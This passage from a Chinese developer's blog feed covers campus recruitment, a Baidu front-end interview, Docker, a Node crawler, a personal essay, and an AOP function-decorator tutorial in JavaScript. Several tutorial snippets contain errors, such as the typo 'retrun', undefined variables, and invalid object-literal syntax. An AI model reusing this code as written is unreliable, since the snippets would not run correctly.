部分提前批内推或者优秀简历免笔试）</li><li>面试（分为三种，视频面，现场面和电话面，一般为三面，三面为HR面，技术岗三面可能都为技术面，部分有增加交叉面)</li></ul></li><li>offer流程<ul><li>意向书和offer流程<ul><li>意向书，意向书是offer前的接收意向说明，意向书少数情况会被企业”拥抱变化”</li><li>offer是用人单位单方愿意接收人才就业，应聘人才有权利拒接，无影响</li></ul></li><li>多offer选择，要综合多方面信息，比如平台大小，发展前景，薪资福利待遇，选择最心仪的</li><li>关于录取通知书，两方和三方<ul><li>三方大四毕业季每个学校都会发，是用人单位，个人和学校三方具有法律效力的合同</li><li>录取通知书是应聘人才愿意接收offer，需要签字生效，会写明应届生需要寄交三方，生效后任何一方违约都需要赔偿录取通知里写明的违约金</li></ul></li><li>正式接受offer后，一般可以选择毕业前去实习，也可以不实习等毕业申请入职即可</li></ul></li></ul></li></ul><p>最后祝福每一位同学带上学士帽的那一刻都已遇见期望的自己，谢谢大家，今天我的演讲到此结束。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;很荣幸今天能和大家在这里有一个交流会，我是计算机学院信管专业一名普通的大四学生，也是行思工作室的一员，时光就像这个秋天一样很短，记忆中仿佛就在昨天，那个背着双肩包怀着对大学憧憬和向往的男孩，转身间却已经成为了学校最年长的一届本科生&lt;/p&gt;
    
    </summary>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/categories/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/tags/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>cheerio+koa-node爬虫贴吧实践</title>
    <link href="https://www.chenqaq.com/2019/11/05/node-cheerio-reptile-md/"/>
    <id>https://www.chenqaq.com/2019/11/05/node-cheerio-reptile-md/</id>
    <published>2019-11-05T13:22:34.000Z</published>
    <updated>2020-07-23T04:13:38.773Z</updated>
    
    <content type="html"><![CDATA[<p>简单写了一个demo，可以设定贴吧名和特定页码爬取，源码：<a href="https://github.com/okaychen/NetworkMonitoring" target="_blank" rel="noopener">node-repitle</a><br>主要用的依赖：cheerio，superagent，koa</p><a id="more"></a><p><img alt="demo" data-src="https://www.chenqaq.com/assets/images/node_cheerio01.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单写了一个demo，可以设定贴吧名和特定页码爬取，源码：&lt;a href=&quot;https://github.com/okaychen/NetworkMonitoring&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;node-repitle&lt;/a&gt;&lt;br&gt;主要用的依赖：cheerio，superagent，koa&lt;/p&gt;
    
    </summary>
    
    
      <category term="Node" scheme="https://www.chenqaq.com/categories/Node/"/>
    
    
      <category term="Node" scheme="https://www.chenqaq.com/tags/Node/"/>
    
      <category term="KOA" scheme="https://www.chenqaq.com/tags/KOA/"/>
    
      <category term="爬虫" scheme="https://www.chenqaq.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>最幸福的人，最好的我们，最向往的生活</title>
    <link href="https://www.chenqaq.com/2019/10/30/life-aboutLife-job20191030-md/"/>
    <id>https://www.chenqaq.com/2019/10/30/life-aboutLife-job20191030-md/</id>
    <published>2019-10-30T06:30:19.000Z</published>
    <updated>2020-07-23T04:13:38.771Z</updated>
    
    <content type="html"><![CDATA[<p>老实说已经持续了很长时间的低产出状态，很久没有认真写一篇自己满意的文章了。今年的秋招似乎来的更早，着手准备已经七月中旬，在拿到用友，滴滴意向之后，最终选择了百度APP移动研发部(手白)结束自己的九月，往年的校园招聘季金九银十，在今年仿佛已经成为了秋招的末端。秋招节奏更快，整个过程我却只是幸运的那一个，我坚信大家都会有最好的结果，在未来的学习生活工作中我也希望我能不遗余力的帮助大家。</p><a id="more"></a><p>之前有同学问我说马上就要迎来考研了，近来学校有一些校园招聘宣讲会，在想有没有必要先参加一下，但是一时间又不知道自己该做什么。首先要清楚的一个事实是，学校的招聘本身很小众化，如果没有找到自己心仪的岗位，不要担心也不要气馁，人生何时都可以大放异彩，我相信这种情况坚持考研才是最正确的选择。该如何选择考研或者就业？这是一个问号，永远没有一个完全确定好坏的答案，我觉得这种情况下一定是结合”个人情况”和”个人特点”综合考虑，是不是有自己感兴趣的职业，评估自己掌握的专业知识和技能，自己更想深造或者是去就业创业等等</p><p>也有些同学会问对于技术学习过程中看过的知识点总是很模糊，我相信这也是我和大家的共性问题，美国缅因州的国家训练实验室曾经做过一个研究，用数字形式形象显示了:采用不同的学习方式，学习者在两周以后还能记住内容（平均学习保持率）的多少。我们会发现，最好的方式是主动学习并且学会分享教授他人，然后会是实践，我一直觉得技术只有在适合它的应用场景中不断加以实践你才会发现它吸引你的魅力。</p><p><img alt="图：学习金字塔，图片来源网络" data-src="https://www.chenqaq.com/assets/images/20191030-001.jpg" class="lazyload"></p><p>另外我会维护一个研发面试知识点的开源库<a href="https://github.com/okaychen/FE-Interview-Questions" target="_blank" rel="noopener">前端研发面试</a>，明年春季招聘之前如期和大家见面，下面是百度上岸的面经回馈给大家：</p><p>一面(百度百科) 9月21号 9点-10点</p><p>自我介绍热身</p><p>Q1：盒模型的概念</p><p>Q2：定位属性和相关的关系，分别相对与谁，占用文档流的关系</p><p>Q3：IFC和BFC</p><p>Q4：移动端布局的解决方案，前辈最想要的答案是rem和em，平时怎么做处理</p><p>Q5：垂直居中和水平居中的多种解决方案，手写</p><p>Q6：双飞翼布局和圣杯布局的了解</p><p>Q7：跨域方案最熟悉哪个，jsonp怎么做的处理，前后端约定参数在什么地方，写出一个jsonp的简单格式，后台拿到参数后怎么做处理</p><p>Q8：对flex布局的了解,有一个场景问题</p><p>Q9：数据类型有哪些，对symbol的了解</p><p>Q10：ES5以及之前和ES6之后数组有哪些的特性，问的比较细</p><p>Q11：数据传输的方法有哪些，这些方法的作用，get和post的区别</p><p>Q12：你觉得ES6有哪些好用的点，介绍一下</p><p>Q13：promise的了解，手写promise.all</p><p>Q14：场景问题，一个引用框的小动画，从box划到引用框的过程中，怎么保持引用框不消失</p><p>Q15：行我就这些啦，你还有什么问题嘛？</p><p>A：第一个问题问了前辈是哪个部门，主要的技术栈是什么，第二个问题前辈有没有什么建议或者对我想说的话</p><p>二面(部门忘记了..) 9月21号 10:30-11:30</p><p>Q1：没有自我介绍，先写了个快排热身..有没有什么好的改进办法</p><p>Q2：websocket的原理，有http了我们为什么需要websocket</p><p>Q3：HTTP和HTTPS的了解，区别有哪些，要准备的很细</p><p>Q4：数字签名，对称加密和非对称加密的理解，在HTTPS哪个过程</p><p>Q5：HTTP2相对于HTTP1的优势和特点（二进制分帧，头部压缩，服务端推送和多路复用），分别介绍一下</p><p>Q6：HTTP的缓存过程（强缓存和协商缓存）要答很细，expires，cache-control，Last-Modified/If-Modified-Since，ETag这些要清楚</p><p>Q7：画一下三次握手和四次挥手，为什么需要四次挥手讲一下</p><p>Q8：从用户输入URL到呈现页面，经历了哪个过程，讲一下自己最熟悉的过程</p><p>Q9：浏览器渲染的过程介绍一下（五步走）</p><p>Q10：场景问题：滑动加载的实现方案</p><p>Q11：如果用户滑动过快如何处理（高频率触发事件：防抖和节流）</p><p>Q12：手写防抖和节流，区别在什么地方</p><p>Q13：性能优化的方案有哪些，要分类尽量答很细</p><p>Q14：VUE组件间通信的方案有哪些（props/$emit+v-on，eventbus，vuex），一共有8种，有些比较偏不会用到，答自己常用的即可</p><p>Q15：对MVVM的理解，实现一个简单的MVVM框架</p><p>Q16：对VUE响应式系统的理解</p><p>Q17：前端安全都知道哪些（csrf，xss）分别介绍一下，如何防范</p><p>Q18：webpack原理了解过嘛</p><p>Q19：webpack经常用到哪些，有手动编写过Loader和Plugin嘛，区别在哪</p><p>三面(手白-技术经理) 9月21号 12:00-13:30</p><p>“等一下，我先看看前面的面试评价”，”你别紧张，前面两面都过了，都到我这了，咱先热热身…”</p><p>Q1：平时有用过百度嘛，问百度的工作原理（百度蜘蛛的构建原理）</p><p>Q2：你觉得百度建索引的过程的原则是什么</p><p>Q3：介绍一下你主要的技术栈，刚才你说ES5和ES6，为什么要特别把它们两个区分开呢，你觉得现在ecmascript发展的大方向是什么，谈谈你自己的理解</p><p>Q4：如果要你从vue向react过渡，你觉得你能很快适应嘛（这时候就要谈自己对于三大框架的理解，要尽量清晰的向前辈讲自己的理解）</p><p>Q5：平时做项目不管后台用什么语言，自己会用node去写后台嘛</p><p>Q6：有用过百度的开源产品嘛（富文本解析，百度地图开放接口），平时会关注他们的源码嘛</p><p>Q7：给定一个数字n，让一个字母”比如a”拼接n次，如果这个数字特别大怎么办，写一下（思路是二进制处理）</p><p>Q8：假如箱子里有n个有序号的小球，我拿出了几个，怎么从剩下的中判断我拿出的是哪几个（思路是用数组下标处理，二点，不要轻易的动对象，尽量用有序去表现无序）</p><p>Q9：你还有什么问题嘛？</p><p>三面前辈和我讲的挺多的，记得当时把我的面试表留在他那里了，百度的同学说三面前辈有优选的名额，做了两种打算，一种最坏的打算和前面面试官在讨论会被刷掉，第二种最好的结果会被三面手白的经理优选，收到意向之后也一直在关心部门，当面签看到录取通知那一刻，很感恩也很幸运。有一种幸运叫不负众望，很难想象一种无言的亲情该有多幸福，也许就是放心去闯吧有我们在，国庆回到家开门看到楼梯意外崴脚的妈妈刚动完手术用着拐杖，告诉我说可能要到春节才能康复，整个秋招我却全然不知，就连爸爸哥哥都不会告诉我，如果这份自己满意的答卷迟到些，我会有多愧疚。</p><p>2020年最幸福的人，最好的我们，最向往的生活，一起冲吧</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;老实说已经持续了很长时间的低产出状态，很久没有认真写一篇自己满意的文章了。今年的秋招似乎来的更早，着手准备已经七月中旬，在拿到用友，滴滴意向之后，最终选择了百度APP移动研发部(手白)结束自己的九月，往年的校园招聘季金九银十，在今年仿佛已经成为了秋招的末端。秋招节奏更快，整个过程我却只是幸运的那一个，我坚信大家都会有最好的结果，在未来的学习生活工作中我也希望我能不遗余力的帮助大家。&lt;/p&gt;
    
    </summary>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/categories/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/tags/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Docker容器实践-Node应用部署</title>
    <link href="https://www.chenqaq.com/2018/12/19/docker-howToDeploying-nodeWebapp-md/"/>
    <id>https://www.chenqaq.com/2018/12/19/docker-howToDeploying-nodeWebapp-md/</id>
    <published>2018-12-19T11:47:46.000Z</published>
    <updated>2020-07-23T04:13:38.765Z</updated>
    
    <content type="html"><![CDATA[<p>下面是一个简单的例子，用来实现如何在docker容器内运行node程序。</p><a id="more"></a><p><video src="https://cdn.jsdelivr.net/gh/okaychen/CDN@1.2/BlogSource/videos/test-2018-12-19_17.23.50.mp4" controls allowfullscreen="true" loop="true" autoplay="autoplay" muted width="100%" min-height="100%">embed: xss–chrome_test</video></p><p>可以通过<code>sudo docker run -it mynodeapp /bin/bash</code>在新容器内开启一个终端并允许进行交互<br><img alt="在新容器内开启一个终端并可以进行交互" data-src="https://www.chenqaq.com/assets/images/docker-bash01.png" class="lazyload"></p><p>关于Dockerfile的简单说明，更新在我的<a href="https://github.com/okaychen/studynotes/blob/master/docker/docker-deploying-node.md" target="_blank" rel="noopener">github的studynotes中</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下面是一个简单的例子，用来实现如何在docker容器内运行node程序。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Docker" scheme="https://www.chenqaq.com/categories/Docker/"/>
    
    
      <category term="Docker" scheme="https://www.chenqaq.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>清风扶桑沉醉不得归途</title>
    <link href="https://www.chenqaq.com/2018/11/06/life-aboutLife20181106/"/>
    <id>https://www.chenqaq.com/2018/11/06/life-aboutLife20181106/</id>
    <published>2018-11-06T06:28:48.000Z</published>
    <updated>2020-07-23T04:13:38.772Z</updated>
    
    <content type="html"><![CDATA[<p>其实这标题已经写了几日，然因外界诱惑加上很难找到一个安静的时间地点去完成这篇文章而迟迟没有构思下笔，直到今天得到11月12日漫威之父斯坦·李病逝的消息，我在计算机实验室写下了这篇文章，其实对我来说是一种罪过，与之相比我更愿意选择一个宁静的夜晚。就这样天堂安详的带走了漫威王国的缔造者之一斯坦·李，就在11月9日电影院上映的《毒液》中，我们还看到您客串的镜头，只愿您在平行宇宙间安好。</p><p><img alt data-src="https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2976545619,795220049&fm=173&app=49&f=JPEG?w=600&h=400&s=F0A8B955CF9144DE96A0A4C20300A0B3" class="lazyload"></p><a id="more"></a><p>我不否认，我是一个前端领域的探索者，更是一个笔者，喜欢在安静的夜晚写上一篇文章，一度成为了我的一种习惯，就像现在每次打开QQ都忍不住看上兴趣部落两眼（虽然我并不认为这是一种好习惯），我希望我能同时拥有前端和笔者的视野，把这种习惯延续下去，值得庆幸的是我有很多精神领袖，阮一峰老师，张鑫旭大神，阿里的狼叔（I5ting），玉伯。虽然都素未谋面，但我一直追随着他们的脚步，在我的圈子中他们频繁出现，从个人博客，知乎，掘金，github，最后到语雀。相信文章是有温情的，虽未曾有过交集，读他们的文章，我仿佛清晰了他们对于技术以及生活的种种姿态，这就是文字的魔力吧！我还有一些追随者和同行者，感谢有人能够支持我的写作，从博客园到github最后到个人博客，让”okaychen“的代号至少在百度搜索清晰明确，还好有你们的存在，给我写作最大的动力。其实用这个代号有些名不副实，我并不会凡事“okay”，我有很强烈并且独立的思想让我尝试拒绝了一些东西。</p><p><img alt="u 2304433983 3090314586 fm 214 gp 0" data-src="https://user-images.githubusercontent.com/32173521/48397188-f1d15900-e757-11e8-90b2-6c681debf313.jpg" class="lazyload"></p><p>有时喜欢笑称“我果然活成了自己的样子”，其实一人发呆亦或未入眠时也难免叹息是错的，青春的光阴岁月我们都曾迷茫和失落。大学两年是最开心充实的日子，因为有师傅一同奋进以及取得种种成果来满足自己的成就感而开心，因为有前端的快速更新迭代而充实，没有青天河，没有北京，电影院，有时甚至没有QQ微信，交际很少，却唯爱写作。我是一个不合格的朋友，因为很少给曾经同窗兄弟以及发小发句贴心问候，只有我身边亲近的看到我的人能感受到我的存在，但是感谢你们待我如初 – 要威傻班长以及飞诸位等等，希望你们早日得以所愿，一生平安。我是一个不合格的管理者，以至于大学二年级有人道来我这个组长很少和他们交流沟通，我曾聚以此事未有丝毫感情色彩的思想沉重反思之，难以破除性格因素，便尝试多利用社交平台沟通，把今年的主要任务放在了社团培养新人以及自身读书提高等方面。我是一个合格的写作者，热爱会促使你“合格”，希望会有越来越多的人喜欢我的写作，以及我运营的github和个人博客等等，也希望在越来越多的平台看到“okaychen”的身影。</p><p>最后送给设计组学弟学妹们，青春的气息是气海雪山，带你入梦，融梦心，破心境，是谓修行，希望你们学有所成，志有所至，开心快乐的度过四年大学时光。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实这标题已经写了几日，然因外界诱惑加上很难找到一个安静的时间地点去完成这篇文章而迟迟没有构思下笔，直到今天得到11月12日漫威之父斯坦·李病逝的消息，我在计算机实验室写下了这篇文章，其实对我来说是一种罪过，与之相比我更愿意选择一个宁静的夜晚。就这样天堂安详的带走了漫威王国的缔造者之一斯坦·李，就在11月9日电影院上映的《毒液》中，我们还看到您客串的镜头，只愿您在平行宇宙间安好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ss0.baidu.com/6ONWsjip0QIZ8tyhnq/it/u=2976545619,795220049&amp;fm=173&amp;app=49&amp;f=JPEG?w=600&amp;h=400&amp;s=F0A8B955CF9144DE96A0A4C20300A0B3&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/categories/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
    
      <category term="岁言心语" scheme="https://www.chenqaq.com/tags/%E5%B2%81%E8%A8%80%E5%BF%83%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>用AOP装饰函数-实践篇</title>
    <link href="https://www.chenqaq.com/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/"/>
    <id>https://www.chenqaq.com/2018/10/23/js-higherOrderFn-DecoratorPatternToAOP2-md/</id>
    <published>2018-10-23T08:16:47.000Z</published>
    <updated>2020-07-23T04:13:38.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="后续：纸上得来终觉浅"><a href="#后续：纸上得来终觉浅" class="headerlink" title="后续：纸上得来终觉浅"></a>后续：纸上得来终觉浅</h1><p>老大见小T终于摸清了用AOP装饰函数的一些套路，很是欣慰，决定用实际情景让他试一试，老大拿出了一个最常见的AOP的经典应用之一—数据统计上报的情景，分离业务代码和数据统计上报的代码，在实际开发中项目结尾阶段难免要加上很多统计数据的代码，这个过程可能被迫改动早已封装好的函数.</p><a id="more"></a><p>1.老大给小T设定了一个情景如下：页面中有一个登录的button，点击这个button会弹出登录的浮层，与此同时需要进行数据上报来统计有多少用户点击了这个登录的button(这个任务可能是在项目结尾阶段进行的)，让小T发现问题并进行改写：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line">            log(textlogin);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span> (<span class="params">tag</span>) </span>&#123;</span></span><br><span class="line">            x = x + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 这里我简单的用login按钮单击的次数来模拟，上报过程略</span></span></span><br><span class="line">        &#125;</span><br><span class="line">        login.onclick = showLogin;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T发现在showLogin函数里既要弹层又要上报点击次数，两个层面的功能，却被耦合在一个函数中，决定用昨天刚写好的AOP试一试:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"login"</span> <span class="attr">id</span>=<span class="string">"login"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">Function</span>.prototype.after = <span class="function"><span class="keyword">function</span>(<span class="params">afterfn</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> ret = _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">                afterfn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span> ret;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> login = <span class="built_in">document</span>.getElementById(<span class="string">'login'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">const</span> textlogin = login.tagName;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> x = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> showLogin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'打开登录浮层'</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> log = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">            x = x+1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'上报标签为：'</span> + tag +<span class="string">','</span>+ <span class="string">'上报次数为：'</span> + x);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        showLogin = showLogin.after(log); <span class="comment">// 打开登录浮层后上报数据</span></span></span><br><span class="line">        login.onclick = showLogin;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T欣喜若狂，这样两个不同层面功能的函数就可以单独维护，不存在耦合问题，决定把自己的成果给老大展示一番，老大看了微微一笑点了点头，觉得小T的进步着实很快，决定让他尝试一下用AOP动态改变函数的参数。</p><p>2.现有一个用于发起ajax请求的函数，这个函数负责项目中所有ajax的异步请求，这个ajax函数一直运转良好，跟CGI合作也很愉快，直到一次遭受了CSRF攻击，解决CSRF攻击最简单的方法就是在HTTP请求中加一个token参数，我们虽然可以选择直接多加一个token参数在ajax函数中。但是整个函数会变得十分僵硬，虽然对于现在的项目没有问题，但是将来把这个函数移植到其他项目，或者一个开源库中供他人使用，token参数都将是多余的。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向后台 cgi 发起一个请求来获取用户信息,传递给 cgi 的参数是baseParam和&#123; name:'sven' &#125;</span></span><br><span class="line"><span class="keyword">let</span> baseParam = &#123;</span><br><span class="line">    modname: modname,</span><br><span class="line">    orgcode: localorgcode,</span><br><span class="line">    cmduuid: cmduuid</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(dir);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type:type,</span><br><span class="line">            url:url,</span><br><span class="line">            data:<span class="built_in">JSON</span>.stringify(<span class="built_in">Object</span>.assign(&#123;&#125;, baseParam, data)),</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                <span class="comment">// 简单假设不做处理</span></span><br><span class="line">                resolve(data);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">                reject(data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">ajax(<span class="string">'get'</span>,<span class="string">'http:// xxx.com/userinfo'</span>,&#123;<span class="attr">name</span>:<span class="string">'sven'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于生成token的函数</span></span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//僵硬的在ajax函数中添加</span></span><br><span class="line"><span class="keyword">var</span> ajax = <span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data = data || &#123;&#125;;</span><br><span class="line">    data.token = getToken();</span><br><span class="line">    <span class="comment">// 发送ajax请求略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小T看到这里，觉得老大讲的确实有道理，僵硬的在ajax函数中增加传递参数也是正确的，但是复用性不大，无论是换一个项目还是在开源库中供别人使用，这个token都可能会是多余的，小T决定在不修改ajax原函数的情况下用AOP试一下改变函数的参数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.before = <span class="function"><span class="keyword">function</span>(<span class="params">beforefn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> _self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        beforefn.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">        <span class="keyword">return</span> _self.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> getToken = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Token'</span>;</span><br><span class="line">&#125;</span><br><span class="line">ajax = ajax.before(<span class="function"><span class="keyword">function</span>(<span class="params">type,url,data</span>)</span>&#123;</span><br><span class="line">    data.Token = getToken();</span><br><span class="line">&#125;)</span><br><span class="line">ajax( <span class="string">'get'</span>, <span class="string">'http:// xxx.com/userinfo'</span>, &#123; <span class="attr">name</span>:<span class="string">'sven'</span> &#125; );</span><br></pre></td></tr></table></figure><p>小T打印出来向后台cgi传递的参数，发现多了token参数<code>{name: &quot;sven&quot;, Token: &quot;Token&quot;}</code>，小T发现用AOP的方式给ajax函数动态装饰上Token参数，保证了ajax是一个纯净的函数，提高ajax函数的复用性。<br>最后老大决定拿出来杀手锏，插件式的表单验证，想试一下小T是不是能融会贯通:</p><p>3.在web项目中，可能存在非常多的表单，如登录，注册，修改用户信息。在表单数据提交给后台之前，常常需要做一些校验，比如登录时需要验证用户名和密码是否为空，这样形如一个formSubmit函数就既要承担提交ajax请求，还要验证用户输入的合法性。这样一来就会造成代码的臃肿，职责混乱，二来谈不上复用性。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"password"</span> <span class="attr">type</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"submitBtn"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> username = <span class="built_in">document</span>.getElementById( <span class="string">'username'</span> ),</span></span><br><span class="line"><span class="javascript">            password = <span class="built_in">document</span>.getElementById( <span class="string">'password'</span> ),</span></span><br><span class="line"><span class="javascript">            submitBtn = <span class="built_in">document</span>.getElementById( <span class="string">'submitBtn'</span> );</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="keyword">const</span> formSubmit = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(username.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    retrun alert(<span class="string">'用户名不能为空'</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"><span class="actionscript">                <span class="keyword">if</span>(password.value == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">return</span> alert(<span class="string">'密码不能为空'</span>);</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">                <span class="keyword">let</span> param = &#123;</span></span><br><span class="line">                    username = username.value,</span><br><span class="line">                    password = password.value</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">                ajax(<span class="string">'http://xxx.com/login'</span>,param); <span class="comment">//ajax实现略</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">            submitBtn.onclick = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">                formSubmit();</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>小T看到这，决定先把校验的逻辑放到validata函数中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> validata = <span 